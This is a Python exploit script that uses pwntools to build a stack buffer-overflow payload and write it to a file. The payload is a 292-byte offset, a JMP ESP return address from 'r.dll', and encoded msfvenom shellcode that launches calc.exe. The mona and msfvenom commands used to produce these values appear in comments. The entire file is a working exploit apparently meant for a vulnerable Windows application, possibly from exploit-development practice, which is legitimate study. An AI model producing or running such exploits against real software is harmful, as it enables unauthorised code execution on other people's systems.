#!/usr/bin/python3
from pwn import p32, write

# !py mona pattern_offset eip
offset = 292
junk = b"A" * offset

# !py mona jmp -r esp -m r.dll
jmpesp = p32(0x6ca2a9bd)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\x48\xc4\x4f\xb7\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xb4\x2c\xcd\xb7\x44\xad\xb2\x3e"
shellcode += b"\xa1\x9c\xf2\x25\xa2\x8f\xc2\x2e\xe6\x23\xa8"
shellcode += b"\x63\x12\xb7\xdc\xab\x15\x70\x6a\x8a\x18\x81"
shellcode += b"\xc7\xee\x3b\x01\x1a\x23\x9b\x38\xd5\x36\xda"
shellcode += b"\x7d\x08\xba\x8e\xd6\x46\x69\x3e\x52\x12\xb2"
shellcode += b"\xb5\x28\xb2\xb2\x2a\xf8\xb5\x93\xfd\x72\xec"
shellcode += b"\x33\xfc\x57\x84\x7d\xe6\xb4\xa1\x34\x9d\x0f"
shellcode += b"\x5d\xc7\x77\x5e\x9e\x64\xb6\x6e\x6d\x74\xff"
shellcode += b"\x49\x8e\x03\x09\xaa\x33\x14\xce\xd0\xef\x91"
shellcode += b"\xd4\x73\x7b\x01\x30\x85\xa8\xd4\xb3\x89\x05"
shellcode += b"\x92\x9b\x8d\x98\x77\x90\xaa\x11\x76\x76\x3b"
shellcode += b"\x61\x5d\x52\x67\x31\xfc\xc3\xcd\x94\x01\x13"
shellcode += b"\xae\x49\xa4\x58\x43\x9d\xd5\x03\x0e\x60\x6b"
shellcode += b"\x3e\x7c\x62\x73\x40\xd1\x0b\x42\xcb\xbe\x4c"
shellcode += b"\x5b\x1e\xfb\xa3\x11\x02\xaa\x2b\xfc\xd7\xee"
shellcode += b"\x31\xff\x02\x2c\x4c\x7c\xa6\xcd\xab\x9c\xc3"
shellcode += b"\xc8\xf0\x1a\x38\xa1\x69\xcf\x3e\x16\x89\xda"
shellcode += b"\x5d\xf9\x19\x86\x8f\x9c\x99\x2d\xcf\x5e\x5a"
shellcode += b"\xae\xcf\x5e\x5a\xae"

payload = junk + jmpesp + shellcode

write("file.txt", payload)
